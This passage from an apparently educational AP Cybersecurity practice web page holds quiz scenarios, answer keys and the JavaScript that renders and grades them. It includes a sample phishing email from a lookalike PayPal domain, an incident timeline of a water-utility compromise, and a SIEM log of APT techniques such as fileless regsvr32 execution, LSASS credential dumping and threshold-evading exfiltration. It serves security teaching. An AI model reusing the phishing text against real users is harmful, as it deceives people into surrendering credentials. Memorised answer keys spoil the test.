+        "correct_answer": "Encryption at Rest (AES-256)",
+        "explanation": "The attacker encrypted the data with AES before sending it, attempting to make the attachment opaque to DLP content inspection. While AES is normally a defensive control, attackers also use encryption to exfiltrate data past content-aware security tools."
+      },
+      {
+        "q": "Which AP topic covers the data protection controls that should have prevented this exfiltration?",
+        "correct_answer": "Topic 5.2 \u2014 Access Controls & Data Protection",
+        "explanation": "Topic 5.2 covers access controls, data classification, and data loss prevention. An insider with unrestricted access to export 150,000 payment records reflects a failure in role-based access control and data handling policies."
+      },
+      {
+        "q": "What access control would have prevented an employee from exporting bulk customer payment data?",
+        "correct_answer": "Role-Based Access Control (RBAC)",
+        "explanation": "RBAC assigns data access privileges based on job function. A bank employee without a specific business need to export 50,000 full payment card records should not have had that export capability. RBAC with least-privilege principles would have blocked the ability to generate this export entirely."
+      }
+    ]
+  },
+  {
+    "unit": "any",
+    "type": "mixed",
+    "difficulty": "beginner",
+    "doc_type": "email",
+    "doc_meta": "Received: Wednesday 16:04 | Inbox: Kevin Marsh, Warehouse Supervisor",
+    "doc_subject": [
+      {
+        "label": "From",
+        "value": "security-noreply@paypa1.com"
+      },
+      {
+        "label": "Subject",
+        "value": "Your PayPal account has been limited"
+      }
+    ],
+    "doc_text": "Dear Customer,\n\nYour PayPal account has been permanently limited due to unusual activity. To restore access, you must verify your identity within 24 hours.\n\nClick here to verify: http://paypa1-secure-verify.com/confirm?token=8821\n\nFailure to verify will result in permanent account closure.\n\nPayPal Security Team",
+    "overall_explanation": "This phishing email uses a lookalike domain (paypa1.com with the number 1 instead of the letter l) and a fake verification link. The urgency and threat of permanent closure are classic social engineering tactics. Security awareness training is the most effective defense.",
+    "questions": [
+      {
+        "q": "What attack technique is this email demonstrating?",
+        "correct_answer": "Phishing / Spear-Phishing",
+        "explanation": "This is a phishing email impersonating PayPal using a typosquatted domain (paypa1.com). The urgency, account limitation threat, and fake verification link are classic phishing indicators designed to trick users into submitting credentials."
+      },
+      {
+        "q": "Who most likely sent this email?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "Mass phishing campaigns impersonating financial services like PayPal are primarily operated by transnational criminal organizations seeking financial account credentials for fraud and theft."
+      },
+      {
+        "q": "Which AP topic does this scenario best illustrate?",
+        "correct_answer": "Topic 1.1 \u2014 Social Engineering",
+        "explanation": "Phishing is the most prevalent form of social engineering. Topic 1.1 covers how attackers use urgency, fear, authority, and fake communications to manipulate users into taking actions against their security interests."
+      },
+      {
+        "q": "What is the most effective countermeasure against phishing emails?",
+        "correct_answer": "Security Awareness Training",
+        "explanation": "Security awareness training that teaches users to inspect sender domains, hover over links before clicking, and report suspicious emails is the most effective countermeasure. MFA provides a safety net if credentials are stolen."
+      }
+    ]
+  },
+  {
+    "unit": "any",
+    "type": "mixed",
+    "difficulty": "intermediate",
+    "doc_type": "incident",
+    "doc_meta": "IR-2026-0302 | Analyst: D. Washington | Multi-Vector Attack",
+    "doc_subject": [
+      {
+        "label": "Target",
+        "value": "Clearfield Municipal Water Utility"
+      },
+      {
+        "label": "Duration",
+        "value": "January 28-30, 2026"
+      }
+    ],
+    "doc_text": "INCIDENT SUMMARY\n\nOn January 28, a water utility operator reported that the SCADA workstation monitoring Station 4 was displaying chemical dosing levels inconsistent with manual meter readings. Investigation found that the workstation had been compromised by ransomware.\n\nTimeline reconstruction:\nJan 26, 09:14 - Operator opens phishing email attachment (invoice PDF)\nJan 26, 09:15 - RAT installed, C2 established\nJan 27, 02:30 - Attacker pivots from workstation to SCADA network\nJan 27, 02:45 - Chemical dosing parameters modified (not executed)\nJan 28, 06:00 - Ransomware deployed to all network-joined hosts\n\nThe dosing modification was caught by a secondary analog monitoring system before it could affect treated water.",
+    "overall_explanation": "This multi-stage attack against critical infrastructure began with a phishing email delivering a RAT, followed by lateral movement to SCADA systems. The complete attack chain spans reconnaissance through taking action. Network segmentation between IT and OT (operational technology) networks is the critical missing control.",
+    "questions": [
+      {
+        "q": "What was the initial access technique used in this attack?",
+        "correct_answer": "Phishing / Spear-Phishing",
+        "explanation": "The attack began when an operator opened a phishing email attachment (invoice PDF) that installed a RAT. This is the initial access phase of the attack chain, using social engineering to gain a foothold on a workstation connected to critical infrastructure."
+      },
+      {
+        "q": "What adversary type most likely targeted a municipal water utility in this manner?",
+        "correct_answer": "Nation-State Actor",
+        "explanation": "Attacks against critical infrastructure such as water treatment facilities that include SCADA system manipulation are associated with nation-state actors pursuing strategic disruption capabilities. The sophistication and targeting of critical infrastructure align with nation-state objectives."
+      },
+      {
+        "q": "Which AP topic covers the final payload deployed in this attack?",
+        "correct_answer": "Topic 4.1 \u2014 Device Vulnerabilities & Malware",
+        "explanation": "Ransomware is a type of malware covered in Topic 4.1. The ransomware deployed to all network-joined hosts represents the taking-action phase of the attack chain, leveraging the malware delivery and lateral movement from prior steps."
+      },
+      {
+        "q": "What network control would have prevented the attacker from pivoting to the SCADA network?",
+        "correct_answer": "Network Segmentation (VLANs / Subnets)",
+        "explanation": "Segmenting the IT network from the OT (operational technology) SCADA network using VLANs and strict firewall rules would have prevented lateral movement from the compromised workstation to chemical dosing systems, containing the breach to the IT environment."
+      }
+    ]
+  },
+  {
+    "unit": "any",
+    "type": "mixed",
+    "difficulty": "advanced",
+    "doc_type": "log",
+    "doc_meta": "Source: Multi-Sensor Correlation | SIEM: ThreatHunter Pro | Alert: APT Campaign Detected",
+    "doc_subject": [
+      {
+        "label": "Campaign",
+        "value": "SHADOW-WIRE-09"
+      },
+      {
+        "label": "Duration",
+        "value": "72 hours"
+      }
+    ],
+    "doc_text": "T+00:00  DNS query: api.microsoft-updatecheck.com (typosquat) from EXEC-PC-01\nT+00:03  HTTPS C2 beacon to 104.21.90.155 (mimics legitimate CDN traffic)\nT+02:14  regsvr32.exe loads remote script (fileless execution)\nT+02:17  LSASS memory access \u2014 credential dump attempt\nT+06:44  Lateral movement: EXEC-PC-01 to FILESERVER-02 using stolen credentials\nT+14:22  Data staged in C:\\Windows\\Temp\\~df8a2.tmp (12.4 GB)\nT+14:55  Exfiltration via HTTPS to 23.227.38.65 in 512KB chunks (SIEM threshold: 1MB)\nT+47:33  Scheduled task deleted, prefetch entries wiped, event logs cleared",
+    "overall_explanation": "This SIEM correlation log shows a complete APT (Advanced Persistent Threat) campaign across 72 hours: initial DNS C2 contact, fileless execution and credential theft, lateral movement, data staging, low-and-slow exfiltration below SIEM thresholds, and evasion. Each phase is visible only through correlated multi-sensor data.",
+    "questions": [
+      {
+        "q": "What malware technique allowed the attacker to execute code without writing files to disk?",
+        "correct_answer": "Fileless Malware",
+        "explanation": "At T+02:14, regsvr32.exe was used to load a remote script in memory without writing a file to disk. This fileless technique uses trusted Windows binaries (living-off-the-land) to execute malicious code that evades file-based antivirus detection."
+      },
+      {
+        "q": "What adversary type operates with this level of sophistication over a 72-hour campaign?",
+        "correct_answer": "Nation-State Actor",
+        "explanation": "A 72-hour campaign with fileless execution, LSASS credential dumping, low-and-slow exfiltration timed to evade SIEM thresholds, and systematic forensic cleanup represents nation-state APT tradecraft. Script kiddies and criminals rarely operate at this level of patience and precision."
+      },
+      {
+        "q": "Which AP topic covers the detection of multi-stage attacks like this one?",
+        "correct_answer": "Topic 4.4 \u2014 Detecting Device Attacks",
+        "explanation": "Topic 4.4 covers behavioral detection approaches for advanced threats on devices including anomaly detection, memory forensics, and the value of EDR tools that detect fileless execution and LSASS access patterns that evade signature-based controls."
+      },
+      {
+        "q": "What control provided the visibility needed to detect this otherwise evasive campaign?",
+        "correct_answer": "SIEM Correlation & Log Monitoring",
+        "explanation": "No single sensor would have detected this campaign. The SIEM correlated DNS anomalies, fileless process behavior, lateral movement, staging, and exfiltration across 72 hours from multiple sensors. Without SIEM correlation, each event would appear innocuous in isolation."
+      }
+    ]
+  }
+]
+;
+
+const ATTACK_OPTIONS = ["ARP Poisoning", "Brute-Force Attack", "Buffer Overflow", "Card Cloning", "Credential Stuffing", "Deepfake / AI Impersonation", "Denial-of-Service (DoS)", "Directory Traversal", "DNS Poisoning", "Dumpster Diving", "Evil Twin Attack", "Fileless Malware", "Insider Threat", "Keylogger", "MAC Flooding", "Password Spraying", "Phishing / Spear-Phishing", "Physical Intrusion (Tailgating/Piggybacking)", "Ransomware", "Remote Access Trojan (RAT)", "Rootkit", "Shoulder Surfing", "SQL Injection", "Stored XSS", "USB-Based Malware", "Vishing", "War Driving", "Worm"];
+const ADVERSARY_OPTIONS = ["Hacktivist", "Insider Threat", "Nation-State Actor", "Script Kiddie", "Transnational Criminal Organization", "Unknown / Unclear"];
+const TOPIC_OPTIONS = ["Topic 1.1 \u2014 Social Engineering", "Topic 1.2 \u2014 Authentication & Password Security", "Topic 1.3 \u2014 Public Network Security", "Topic 1.4 \u2014 AI-Based Attacks", "Topic 2.1 \u2014 Cyber Foundations & Attack Phases", "Topic 2.2 \u2014 Physical Vulnerabilities", "Topic 2.3 \u2014 Protecting Physical Spaces", "Topic 2.4 \u2014 Detecting Physical Attacks", "Topic 3.1 \u2014 Network Vulnerabilities", "Topic 3.2 \u2014 Network Controls & Wireless", "Topic 3.3 \u2014 Network Segmentation", "Topic 3.4 \u2014 Firewalls & ACLs", "Topic 3.5 \u2014 Detecting Network Attacks", "Topic 4.1 \u2014 Device Vulnerabilities & Malware", "Topic 4.2 \u2014 Authentication & Passwords", "Topic 4.3 \u2014 Protecting Devices", "Topic 4.4 \u2014 Detecting Device Attacks", "Topic 5.1 \u2014 Application Vulnerabilities", "Topic 5.2 \u2014 Access Controls & Data Protection", "Topic 5.3 \u2014 Symmetric Cryptography", "Topic 5.4 \u2014 Asymmetric Cryptography", "Topic 5.5 \u2014 Secure by Design", "Topic 5.6 \u2014 Detecting Application Attacks"];
+const COUNTERMEASURE_OPTIONS = ["Acceptable Use Policy (AUP)", "Access Control Vestibule (Mantrap)", "Anti-Malware with Updated Signatures", "Automated OS Patching", "Badge Access Control & Audit Logs", "BIOS/UEFI Password", "Disable USB Autorun / Port Lockdown", "Encryption at Rest (AES-256)", "Full-Tunnel VPN", "Host-Based Firewall", "Input Validation & Parameterized Queries", "MFA (Multifactor Authentication)", "Network Segmentation (VLANs / Subnets)", "NIDS / NIPS Deployment", "Offsite Encrypted Backups", "Password Manager & Unique Passwords", "Perimeter Firewall with ACLs", "Role-Based Access Control (RBAC)", "Security Awareness Training", "Security Cameras & Live Monitoring", "Server Cabinet Locks", "SIEM Correlation & Log Monitoring", "WPA3 Wireless Encryption", "Web Application Firewall (WAF)"];
+const SCENARIO_TYPES = [{"id": "email", "label": "\ud83d\udce7 Email", "desc": "Suspicious message received by an employee"}, {"id": "log", "label": "\ud83d\udccb Network Log", "desc": "Security log excerpt flagged for review"}, {"id": "incident", "label": "\ud83d\udd0d Incident Report", "desc": "Post-breach investigation narrative"}, {"id": "physical", "label": "\ud83c\udfe2 Physical Observation", "desc": "Something noticed on-site"}, {"id": "mixed", "label": "\ud83c\udfb2 Surprise Me", "desc": "Any scenario type, any unit"}];
+const UNIT_FILTERS = [{"id": "any", "label": "Any Unit"}, {"id": "1", "label": "Unit 1 \u2014 Introduction to Security"}, {"id": "2", "label": "Unit 2 \u2014 Securing Spaces"}, {"id": "3", "label": "Unit 3 \u2014 Securing Networks"}, {"id": "4", "label": "Unit 4 \u2014 Securing Devices"}, {"id": "5", "label": "Unit 5 \u2014 Applications & Data"}];
+
+// State
+var selectedType = null, selectedUnit = null, selectedDiff = null;
+var scenarioData = null;   // parsed Claude response
+var userAnswers = {};      // q-index -> selected value
+var sessionHistory = [];   // true/false per round
+var totalCorrect = 0, totalRounds = 0;
+
+var DIFF_DESCS = {
+  Standard: "Single attack technique, clear indicators, direct countermeasure. Good for introducing a new unit.",
+  Advanced:  "Plausible distractors, attack chain has 2 stages, countermeasure requires layered thinking.",
+  Expert:    "Multi-stage attack or compound vulnerability, adversary mixes techniques, countermeasure trade-offs required."
+};
+
+// ── BUILD SETUP UI ────────────────────────────────────────
+function buildSetup() {
+  var tg = document.getElementById("type-grid");
+  SCENARIO_TYPES.forEach(function(t) {
+    var el = document.createElement("div");
+    el.className = "type-opt";
+    el.dataset.id = t.id;
+    el.onclick = function() { selectType(t.id); };
+    var lbl = document.createElement("div"); lbl.className = "type-label"; lbl.textContent = t.label;
+    var desc = document.createElement("div"); desc.className = "type-desc"; desc.textContent = t.desc;
+    el.appendChild(lbl); el.appendChild(desc);
+    tg.appendChild(el);
+  });
+
+  var ul = document.getElementById("unit-list");
+  UNIT_FILTERS.forEach(function(u) {
+    var el = document.createElement("div");
+    el.className = "unit-opt";
+    el.dataset.id = u.id;
+    el.onclick = function() { selectUnit(u.id); };
+    var dot = document.createElement("div"); dot.className = "unit-dot";
+    var lbl = document.createTextNode(u.label);
+    el.appendChild(dot); el.appendChild(lbl);
+    ul.appendChild(el);
+  });
+}
+
+function selectType(id) {
+  selectedType = id;
+  document.querySelectorAll(".type-opt").forEach(function(el) {
+    el.classList.toggle("selected", el.dataset.id === id);
+  });
+  checkReady();
+}
+
+function selectUnit(id) {
+  selectedUnit = id;
+  document.querySelectorAll(".unit-opt").forEach(function(el) {
+    el.classList.toggle("selected", el.dataset.id === id);
+  });
+  checkReady();
+}
+
+function selectDiff(btn) {
+  selectedDiff = btn.dataset.d;
+  document.querySelectorAll(".diff-btn").forEach(function(b) { b.classList.remove("selected"); });
+  btn.classList.add("selected");
+  document.getElementById("diff-desc").textContent = DIFF_DESCS[selectedDiff] || "";
+  checkReady();
+}
+
+function checkReady() {
+  document.getElementById("gen-btn").disabled = !(selectedType && selectedUnit && selectedDiff);
+}
+
+// ── GENERATE ──────────────────────────────────────────────
+function generateScenario() {
+  if (!selectedType || !selectedUnit || !selectedDiff) return;
+
+  // Filter scenarios by selections
+  var pool = SPOT_SCENARIOS.filter(function(s) {
+    var typeMatch = selectedType === 'mixed' || s.type === selectedType || s.type === 'mixed';
+    var unitMatch = selectedUnit === 'any' || s.unit === selectedUnit || s.unit === 'any';
+    var diffMatch = s.difficulty === selectedDiff;
+    return typeMatch && unitMatch && diffMatch;
+  });
+
+  // Widen filter if no matches (drop type requirement)
+  if (pool.length === 0) {
+    pool = SPOT_SCENARIOS.filter(function(s) {
+      var unitMatch = selectedUnit === 'any' || s.unit === selectedUnit || s.unit === 'any';
+      var diffMatch = s.difficulty === selectedDiff;
+      return unitMatch && diffMatch;
+    });
+  }
+
+  // Last resort: just match difficulty
+  if (pool.length === 0) {
+    pool = SPOT_SCENARIOS.filter(function(s) { return s.difficulty === selectedDiff; });
+  }
+
+  if (pool.length === 0) {
+    pool = SPOT_SCENARIOS;
+  }
+
+  // Pick randomly, avoiding the last scenario shown
+  var choices = pool.filter(function(s) { return s !== scenarioData; });
+  if (choices.length === 0) choices = pool;
+  scenarioData = choices[Math.floor(Math.random() * choices.length)];
+
+  userAnswers = {};
+  showScreen('scenario');
+  renderScenario();
+}
+
+
+function renderScenario() {
+  var s = scenarioData;
+
+  // Doc header
+  var typeIcons = {
+    email:    '<svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>',
+    log:      '<svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="9" y1="7" x2="15" y2="7"/><line x1="9" y1="11" x2="15" y2="11"/><line x1="9" y1="15" x2="13" y2="15"/></svg>',
+    incident: '<svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>',
+    physical: '<svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>',
+  };
+  var typeLabels = { email:"Email", log:"Network Log", incident:"Incident Report", physical:"Physical Observation" };
+  var dtype = s.doc_type || "email";
+  var badge = document.getElementById("doc-type-badge");
+  badge.innerHTML = (typeIcons[dtype] || typeIcons.email) + "<span>" + (typeLabels[dtype] || dtype) + "</span>";
+  document.getElementById("doc-meta").textContent = s.doc_meta || "";
+
+  // Subject fields
+  var subj = document.getElementById("doc-subject");
+  if (s.doc_subject && s.doc_subject.length) {
+    subj.style.display = "flex";
+    subj.innerHTML = "";
+    s.doc_subject.forEach(function(f) {
+      var wrap = document.createElement("div");
+      wrap.style.cssText = "display:flex;gap:.35rem;margin-right:1rem";
+      var lbl = document.createElement("span");
+      lbl.style.color = "var(--muted)";
+      lbl.textContent = f.label + ":";
+      var val = document.createElement("span");
+      val.style.color = "var(--white)";
+      val.style.fontWeight = "500";
+      val.textContent = f.value;
+      wrap.appendChild(lbl); wrap.appendChild(val);
+      subj.appendChild(wrap);
+    });
+  } else {
+    subj.style.display = "none";
+  }
+
+  // Body
+  var docTextEl = document.getElementById("doc-text");
+  docTextEl.textContent = s.doc_text || "";
+  docTextEl.className = "doc-text" + (dtype === "log" ? " log-font" : "");
+
+  // Questions
+  var qa = document.getElementById("questions-area");
+  qa.innerHTML = "";
+  var answerPools = [ATTACK_OPTIONS, ADVERSARY_OPTIONS, TOPIC_OPTIONS, COUNTERMEASURE_OPTIONS];
+  var qLabels = ["Attack Technique", "Adversary Type", "AP Topic Area", "Best Countermeasure"];
+  var qColors = ["var(--red)", "var(--amber)", "var(--cyan)", "var(--green)"];
+
+  (s.questions || []).forEach(function(q, i) {
+    var block = document.createElement("div");
+    block.className = "question-block";
+
+    var qnum = document.createElement("div");
+    qnum.className = "q-num";
+    qnum.style.color = qColors[i];
+    qnum.style.setProperty("--qc", qColors[i]);
+    qnum.innerHTML = '<span style="display:inline-block;width:14px;height:2px;background:' + qColors[i] + ';margin-right:6px;vertical-align:middle"></span>Question ' + (i+1) + " — " + qLabels[i];
+
+    var qtext = document.createElement("div");
+    qtext.className = "q-text";
+    qtext.textContent = q.q || ("Identify the " + qLabels[i]);
+
+    var opts = document.createElement("div");
+    opts.className = "options-grid";
+
+    // Build a shuffled subset: correct + 4 distractors
+    var pool = answerPools[i];
+    var correct = q.correct_answer;
+    var distractors = shuffle(pool.filter(function(o) { return o !== correct; })).slice(0, 4);
+    var choices = shuffle([correct].concat(distractors));
+
+    choices.forEach(function(choice) {
+      var btn = document.createElement("button");
+      btn.className = "opt";
+      btn.dataset.val = choice;
+      btn.dataset.qidx = i;
+
+      var dot = document.createElement("div"); dot.className = "opt-dot";
+      var txt = document.createElement("div"); txt.className = "opt-text"; txt.textContent = choice;
+      btn.appendChild(dot); btn.appendChild(txt);
+
+      btn.onclick = function() {
+        // deselect others in this group
+        block.querySelectorAll(".opt").forEach(function(b) { b.classList.remove("selected"); });
+        btn.classList.add("selected");
+        userAnswers[i] = choice;
+        updateSubmitBtn();
+      };
+      opts.appendChild(btn);
+    });
+
+    block.appendChild(qnum);
+    block.appendChild(qtext);
+    block.appendChild(opts);
+    qa.appendChild(block);
+  });
+
+  updateSubmitBtn();
+  updateStreak();
+}
+
+function shuffle(arr) {
+  var a = arr.slice();
+  for (var i = a.length - 1; i > 0; i--) {
+    var j = Math.floor(Math.random() * (i + 1));
+    var tmp = a[i]; a[i] = a[j]; a[j] = tmp;
+  }
+  return a;
+}
+
+function updateSubmitBtn() {
+  var answered = Object.keys(userAnswers).length;
+  var total = (scenarioData && scenarioData.questions) ? scenarioData.questions.length : 4;
+  var btn = document.getElementById("submit-btn");
+  btn.disabled = answered < total;
+  document.getElementById("progress-note").textContent = answered < total
+    ? (total - answered) + " answer" + (total - answered === 1 ? "" : "s") + " remaining"
+    : "All answered — ready to submit";
+}
+
+// ── SUBMIT ────────────────────────────────────────────────
+function submitAnswers() {
+  var s = scenarioData;
+  var questions = s.questions || [];
+  var correct = 0;
+
+  var overlay = document.getElementById("results-overlay");
+  var body = document.getElementById("rb-body");
+  body.innerHTML = "";
+
+  var qLabels = ["Attack Technique", "Adversary Type", "AP Topic Area", "Best Countermeasure"];
+  var qColors = ["var(--red)", "var(--amber)", "var(--cyan)", "var(--green)"];
+
+  questions.forEach(function(q, i) {
+    var isCorrect = userAnswers[i] === q.correct_answer;
+    if (isCorrect) correct++;
+
+    var div = document.createElement("div");
+    div.className = "q-result " + (isCorrect ? "correct" : "wrong");
+
+    var top = document.createElement("div"); top.className = "qr-top";
+    var icon = document.createElement("div");
+    icon.className = "qr-icon " + (isCorrect ? "ci" : "wi");
+    icon.innerHTML = isCorrect
+      ? '<svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg>'
+      : '<svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
+    var qLabel = document.createElement("div");
+    qLabel.className = "qr-q";
+    qLabel.style.color = qColors[i];
+    qLabel.textContent = "Q" + (i+1) + " — " + qLabels[i];
+    top.appendChild(icon); top.appendChild(qLabel);
+
+    var ans = document.createElement("div"); ans.className = "qr-answers";
+    if (!isCorrect) {
+      var s1 = document.createElement("div"); s1.className = "qr-student";
+      s1.innerHTML = "Your answer: <span class='wrong-val'>" + escHtml(userAnswers[i] || "none") + "</span>";
+      var s2 = document.createElement("div"); s2.className = "qr-correct";
+      s2.textContent = "Correct: " + (q.correct_answer || "");
+      ans.appendChild(s1); ans.appendChild(s2);
+    } else {
+      var s1 = document.createElement("div"); s1.className = "qr-student";
+      s1.innerHTML = "Your answer: <span class='correct-val'>" + escHtml(userAnswers[i]) + "</span>";
+      ans.appendChild(s1);
+    }
+
+    var expl = document.createElement("div"); expl.className = "qr-explanation";
+    expl.textContent = q.explanation || "";
+
+    div.appendChild(top); div.appendChild(ans); div.appendChild(expl);
+    body.appendChild(div);
+  });
+
+  // Overall explanation
+  if (s.overall_explanation) {
+    var overall = document.createElement("div");
+    overall.style.cssText = "background:rgba(0,212,200,.05);border:1px solid rgba(0,212,200,.2);border-radius:12px;padding:1rem 1.15rem;font-size:.85rem;line-height:1.72;color:var(--white)";
+    var olbl = document.createElement("div");
+    olbl.style.cssText = "font-size:.7rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--cyan);margin-bottom:.4rem";
+    olbl.textContent = "Full Analysis";
+    var otxt = document.createElement("div");
+    otxt.textContent = s.overall_explanation;
+    overall.appendChild(olbl); overall.appendChild(otxt);
+    body.appendChild(overall);
+  }
+
+  // Score orb
+  var pct = Math.round(correct / questions.length * 100);
+  var color = pct >= 75 ? "var(--cyan)" : pct >= 50 ? "var(--amber)" : "var(--red)";
+  var row = document.getElementById("rb-score-row");
+  row.innerHTML = "";
+  var orb = document.createElement("div");
+  orb.className = "rb-orb";
+  orb.style.borderColor = color;
+  var orbPct = document.createElement("div"); orbPct.className = "orb-pct"; orbPct.style.color = color; orbPct.textContent = pct + "%";
+  var orbLbl = document.createElement("div"); orbLbl.className = "orb-lbl"; orbLbl.textContent = correct + "/" + questions.length;
+  orb.appendChild(orbPct); orb.appendChild(orbLbl);
+  var gradeDiv = document.createElement("div");
+  var grade = document.createElement("div");
+  grade.className = "rb-grade";
+  grade.textContent = pct === 100 ? "Perfect Analysis!" : pct >= 75 ? "Strong Read" : pct >= 50 ? "Partial Credit" : "Review Needed";
+  gradeDiv.appendChild(grade);
+  row.appendChild(orb); row.appendChild(gradeDiv);
+
+  document.getElementById("rb-summary").textContent = pct === 100
+    ? "You correctly identified every element of this attack. Excellent AP exam preparation."
+    : "Review the explanations above. Each one names the specific indicator in the scenario that confirms the correct answer.";
+
+  // Update session
+  var roundCorrect = correct === questions.length;
+  sessionHistory.push(roundCorrect);
+  if (roundCorrect) totalCorrect++;
+  totalRounds++;
+  updateStreak();
+
+  overlay.classList.add("active");
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
+// ── SESSION STREAK ────────────────────────────────────────
+function updateStreak() {
+  var dots = document.getElementById("streak-dots");
+  if (!dots) return;
+  dots.innerHTML = "";
+  var show = sessionHistory.slice(-10);
+  for (var i = 0; i < 10; i++) {
+    var d = document.createElement("div");
+    d.className = "streak-dot" + (i < show.length && show[i] ? " hit" : "");
+    dots.appendChild(d);
+  }
+  document.getElementById("streak-score").textContent = totalCorrect + " / " + totalRounds + " correct";
+}
+
+// ── NAVIGATION ────────────────────────────────────────────
+function nextScenario() {
+  document.getElementById("results-overlay").classList.remove("active");
+  generateScenario();
+}
+function closeResults() { document.getElementById("results-overlay").classList.remove("active"); }
+function goSetup() { document.getElementById("results-overlay").classList.remove("active"); showScreen("setup"); }
+
+function showScreen(name) {
+  document.querySelectorAll(".screen").forEach(function(s) { s.classList.remove("active"); });
+  document.getElementById("screen-" + name).classList.add("active");
+  window.scrollTo(0, 0);
+}
+
+// ── INIT ──────────────────────────────────────────────────
+buildSetup();
+</script>
+
+
+<footer style="background:var(--navy-mid);border-top:1px solid var(--border);padding:1.25rem clamp(1rem,3vw,2rem);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.75rem;font-size:.78rem;color:var(--muted)">
+  <span>&copy; 2026 apcyber.net &mdash; An unofficial supplemental tool. Independent educational resource. Not affiliated with, endorsed by, or sponsored by the College Board. AP&reg; is a registered trademark of the College Board.</span>
+  <div style="display:flex;gap:1rem">
+    <a href="legal.html" style="color:var(--muted);text-decoration:none;transition:color .18s" onmouseover="this.style.color='var(--cyan)'" onmouseout="this.style.color='var(--muted)'">Privacy Policy</a>
+    <a href="legal.html?tab=terms" style="color:var(--muted);text-decoration:none;transition:color .18s" onmouseover="this.style.color='var(--cyan)'" onmouseout="this.style.color='var(--muted)'">Terms of Service</a>
+  </div>
+</footer>
+<script>
+function toggleMobileNav(){var d=document.getElementById('mobile-nav-drawer'),b=document.getElementById('mobile-nav-backdrop');if(!d||!b)return;var open=d.classList.contains('open');if(open){d.classList.remove('open');b.classList.remove('open');document.body.style.overflow='';}else{d.classList.add('open');b.classList.add('open');document.body.style.overflow='hidden';}}
+function closeMobileNav(){var d=document.getElementById('mobile-nav-drawer'),b=document.getElementById('mobile-nav-backdrop');if(d)d.classList.remove('open');if(b)b.classList.remove('open');document.body.style.overflow='';}
+document.addEventListener('keydown',function(e){if(e.key==='Escape')closeMobileNav();});
+</script>
+</body>
+</html>
